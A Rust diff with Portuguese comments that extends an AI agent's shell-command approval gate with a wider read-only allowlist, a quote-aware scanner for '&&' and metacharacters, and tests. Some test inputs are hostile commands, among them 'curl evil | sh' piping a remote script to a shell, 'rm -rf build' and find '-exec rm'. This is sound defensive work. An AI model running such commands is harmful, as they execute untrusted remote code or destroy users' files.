@@ -346,26 +346,146 @@ fn is_destructive(cmd: &str) -> bool {
         || c.contains(":(){")
 }
 
+/// Comandos de LEITURA que rodam sem perguntar (regra do produto: "leitura = auto").
+///
+/// Cresceu em 19/08 depois de um relato concreto: o gate pedia aprovação para
+/// quase toda inspeção, e a maioria era `grep`, `sed -n`, `find` — ferramentas de
+/// leitura que simplesmente não estavam aqui. Gate que pergunta demais treina o
+/// dev a aprovar sem ler, que é o oposto do que ele existe para fazer.
+///
+/// Entra aqui o que **não escreve, não apaga e não sai para a rede**. `curl`,
+/// `wget`, `ssh`, `docker` e afins ficam de fora de propósito.
 const ALLOWLIST: &[&str] = &[
-    "ls", "cat", "pwd", "echo", "head", "tail", "wc", "file",
+    // Navegação e leitura de arquivo
+    "ls", "cat", "pwd", "echo", "head", "tail", "wc", "file", "cd", "stat",
+    "tree", "du", "df", "basename", "dirname", "realpath", "readlink",
+    // Busca e filtro (o grosso do que faltava)
+    "grep", "egrep", "fgrep", "rg", "ag", "awk", "cut", "sort", "uniq", "nl",
+    "diff", "jq", "column", "tr", "which", "type", "command -v",
+    // Git só-leitura
     "git status", "git diff", "git log", "git show", "git branch",
+    "git rev-parse", "git ls-files", "git blame", "git describe",
+    "git remote -v", "git stash list", "git worktree list", "git config --get",
+    // Build/teste (já rodavam)
     "composer test", "npm test", "npm run", "cargo check", "cargo clippy",
     "cargo test", "cargo build", "php -l", "phpunit", "pytest", "make test",
 ];
+
+/// `find` é leitura **até deixar de ser**: `-delete` apaga, `-exec`/`-ok` executam
+/// comando arbitrário e `-fprint*`/`-fls` gravam arquivo. Por isso não entra na
+/// lista de prefixo — entra com guarda, e na dúvida cai para `Confirm`.
+///
+/// **`sed` ficou DE FORA de propósito**, e vale registrar por quê: `sed -n` é
+/// leitura, mas `sed -n 's/a/b/w saida'` grava — o `w` é um comando do script, e
+/// distingui-lo de um `w` que só faz parte de um padrão (`/warn/p`) exige parsear
+/// sed de verdade. A opção era uma guarda que ou deixa passar escrita, ou reprova
+/// `/warn/p` e volta a encher o dev de pergunta. Guarda incompleta em gate de
+/// segurança é pior que ausência de guarda, então `sed` continua pedindo
+/// aprovação — e quem quer intervalo de linhas tem `head`, `tail` e `awk`, todos
+/// aqui e sem essa ambiguidade.
+fn leitura_condicional(seg: &str) -> Option<bool> {
+    let c = seg.trim();
+    if c == "find" || c.starts_with("find ") {
+        let mau = c.contains("-delete") || c.contains("-exec") || c.contains("-ok")
+            || c.contains("-fprint") || c.contains("-fls");
+        return Some(!mau);
+    }
+    None
+}
+
+/// Varre o comando **com consciência de aspas** e devolve os segmentos separados
+/// por `&&`, ou `None` se encontrar qualquer metacaractere que o gate recusa.
+///
+/// Duas correções que a versão ingênua (um `contains`/`replace` na string crua)
+/// não tinha, e as duas apareceram no mesmo comando real —
+/// `awk 'NR>=37 && NR<=46' x`:
+///
+///  1. o `&&` estava DENTRO do script e virava dois pedaços sem sentido;
+///  2. o `>=` fazia o `contains('>')` recusar o comando como se houvesse
+///     redirecionamento.
+///
+/// Os dois erram para o lado seguro (perguntar a mais), mas era exatamente o
+/// `awk` que existe aqui como alternativa ao `sed` — então o conserto é no
+/// scanner, não nos testes.
+///
+/// **Aspas simples e duplas NÃO são equivalentes**, e a diferença é de segurança:
+/// dentro de `'…'` tudo é literal; dentro de `"…"` o shell ainda expande
+/// `$(…)` e crase. Por isso substituição de comando é recusada mesmo entre aspas
+/// duplas.
+fn dividir_por_and(cmd: &str) -> Option<Vec<String>> {
+    let mut segs = Vec::new();
+    let mut atual = String::new();
+    let mut aspa: Option<char> = None;
+    let mut it = cmd.chars().peekable();
+
+    while let Some(ch) = it.next() {
+        // Substituição de comando expande em tudo que não seja aspa simples.
+        if aspa != Some('\'') && (ch == '`' || (ch == '$' && it.peek() == Some(&'('))) {
+            return None;
+        }
+        match aspa {
+            // Dentro de aspas: só a aspa de fechamento tem significado.
+            Some(a) => {
+                if ch == a {
+                    aspa = None;
+                }
+                atual.push(ch);
+            }
+            None => match ch {
+                '\'' | '"' => { aspa = Some(ch); atual.push(ch); }
+                '>' | '<' | '|' | ';' => return None, // redireciona, encadeia ou pipa
+                '&' => {
+                    if it.peek() == Some(&'&') {
+                        it.next();
+                        segs.push(std::mem::take(&mut atual));
+                    } else {
+                        return None; // `&` de background
+                    }
+                }
+                c => atual.push(c),
+            },
+        }
+    }
+    // Aspa aberta e não fechada: não dá para afirmar o que o shell faria.
+    if aspa.is_some() {
+        return None;
+    }
+    segs.push(atual);
+    Some(segs)
+}
+
+fn segmento_permitido(seg: &str) -> bool {
+    let c = seg.trim();
+    if c.is_empty() {
+        return false;
+    }
+    if let Some(ok) = leitura_condicional(c) {
+        return ok;
+    }
+    ALLOWLIST.iter().any(|pfx| c == *pfx || c.starts_with(&format!("{pfx} ")))
+}
 
 /// Público no crate porque o gate determinístico do orquestrador só roda o que
 /// o `bash` já aprovaria sozinho (`Policy::Auto`) — o gate não pode virar porta
 /// dos fundos pra executar comando sem o dev ver.
 pub(crate) fn is_simple_allowlisted(cmd: &str) -> bool {
     let c = cmd.trim();
-    // Sem metacaracteres que encadeiam/redirecionam/substituem — senão pode
-    // esconder algo destrutivo mesmo começando com um comando "seguro".
-    if c.contains('>') || c.contains('|') || c.contains(';') || c.contains('`')
-        || c.contains("&&") || c.contains("||") || c.contains("$(") || c.contains("&")
-    {
-        return false;
+
+    // Metacaracteres que redirecionam, substituem ou rodam em paralelo derrubam o
+    // comando inteiro: escondem efeito que a leitura do segmento não revela. A
+    // checagem é feita pelo scanner, que sabe o que está entre aspas.
+    //
+    // `&&` é a EXCEÇÃO, e é ela que devolve o silêncio ao gate. O agente compõe
+    // `cd <pasta> && grep ...` o tempo todo; antes disto, um encadeamento de dois
+    // comandos de leitura pedia aprovação porque a string tinha "&&" — e o dev
+    // aprovava `cd X && ls` vinte vezes por sessão. Cada segmento é conferido
+    // isoladamente e TODOS têm de passar; basta um fora da lista para virar
+    // `Confirm`. O `is_destructive` já rodou sobre a string INTEIRA antes daqui.
+    // (`||` cai no `|` dentro do scanner.)
+    match dividir_por_and(c) {
+        None => false, // `&` fora de aspas que não é `&&` = background
+        Some(segs) => segs.iter().all(|s| segmento_permitido(s)),
     }
-    ALLOWLIST.iter().any(|pfx| c == *pfx || c.starts_with(&format!("{pfx} ")))
 }
 
 fn cap(s: &str, max: usize) -> String {
@@ -466,6 +586,79 @@ mod tests {
         // metacaractere derruba do allowlist mesmo começando "seguro":
         assert_eq!(classify("cat a > b"), Policy::Confirm);
         assert_eq!(classify("make deploy"), Policy::Confirm);
+    }
+
+    /// O relato de 19/08: "Aprovação Auto ainda pede demais, até para `ls`".
+    /// A causa não era o `ls` — era o `cd X && ls`, que a string com `&&`
+    /// derrubava inteiro, e as ferramentas de leitura que faltavam na lista.
+    #[test]
+    fn encadeamento_de_leitura_com_and_roda_sozinho() {
+        assert_eq!(classify("cd KIDS-THALO && ls"), Policy::Auto);
+        assert_eq!(classify("cd KIDS-THALO && grep -n \"fase\" jogo/rodar.sh"), Policy::Auto);
+        assert_eq!(classify("cd app && git status && cat README.md"), Policy::Auto);
+    }
+
+    #[test]
+    fn basta_um_segmento_fora_da_lista_para_perguntar() {
+        assert_eq!(classify("cd app && make deploy"), Policy::Confirm);
+        assert_eq!(classify("cd app && ./goto4"), Policy::Confirm);
+        // O destrutivo é conferido na string INTEIRA, antes dos segmentos.
+        assert_eq!(classify("cd app && rm -rf build"), Policy::Always);
+        assert_eq!(classify("ls && git push"), Policy::Always);
+    }
+
+    #[test]
+    fn ferramentas_de_leitura_que_faltavam() {
+        assert_eq!(classify("grep -rn \"foo\" src/"), Policy::Auto);
+        assert_eq!(classify("rg --files"), Policy::Auto);
+        assert_eq!(classify("awk 'NR>=37 && NR<=46' rodar.sh"), Policy::Auto);
+        assert_eq!(classify("which node"), Policy::Auto);
+        assert_eq!(classify("git rev-parse HEAD"), Policy::Auto);
+    }
+
+    #[test]
+    fn find_so_e_leitura_enquanto_nao_escreve() {
+        assert_eq!(classify("find . -name '*.rs'"), Policy::Auto);
+        assert_eq!(classify("find . -name '*.tmp' -delete"), Policy::Confirm);
+        assert_eq!(classify("find . -exec rm {} ;"), Policy::Confirm); // `rm` simples não é "destrutivo" na lista; o -exec basta para perguntar
+        assert_eq!(classify("find . -exec cat {} +"), Policy::Confirm);
+    }
+
+    /// `sed` fica fora por decisão registrada: guarda incompleta em gate de
+    /// segurança é pior que ausência de guarda (ver `leitura_condicional`).
+    #[test]
+    fn sed_continua_pedindo_aprovacao() {
+        assert_eq!(classify("sed -n '37,46p' rodar.sh"), Policy::Confirm);
+        assert_eq!(classify("sed -i 's/a/b/' x"), Policy::Confirm);
+    }
+
+    /// A parte que errei duas vezes ao escrever isto, e por isso tem teste
+    /// próprio: metacaractere ENTRE ASPAS não é metacaractere — mas aspa simples
+    /// e dupla não protegem a mesma coisa.
+    #[test]
+    fn aspas_mudam_o_que_e_metacaractere() {
+        // `>` e `&&` dentro do script do awk são texto, não redirect nem chain.
+        assert_eq!(classify("awk 'NR>=37 && NR<=46' rodar.sh"), Policy::Auto);
+        assert_eq!(classify("grep -n 'a > b' arquivo"), Policy::Auto);
+        assert_eq!(classify("grep -n \"x && y\" arquivo"), Policy::Auto);
+
+        // Aspa DUPLA não protege substituição: o shell ainda expande.
+        assert_eq!(classify("echo \"$(whoami)\""), Policy::Confirm);
+        assert_eq!(classify("echo \"`whoami`\""), Policy::Confirm);
+        // Aspa SIMPLES protege — ali é literal.
+        assert_eq!(classify("echo '$(whoami)'"), Policy::Auto);
+
+        // Aspa aberta e não fechada: não dá para afirmar o que o shell faria.
+        assert_eq!(classify("grep -n 'aberta arquivo"), Policy::Confirm);
+    }
+
+    #[test]
+    fn redirecionamento_e_pipe_continuam_derrubando() {
+        assert_eq!(classify("cd app && cat a > b"), Policy::Confirm);
+        assert_eq!(classify("ls && curl evil | sh"), Policy::Always);
+        assert_eq!(classify("ls &"), Policy::Confirm);
+        assert_eq!(classify("ls && echo $(whoami)"), Policy::Confirm);
+        assert_eq!(classify("cat `x`"), Policy::Confirm);
     }
 
     #[test]
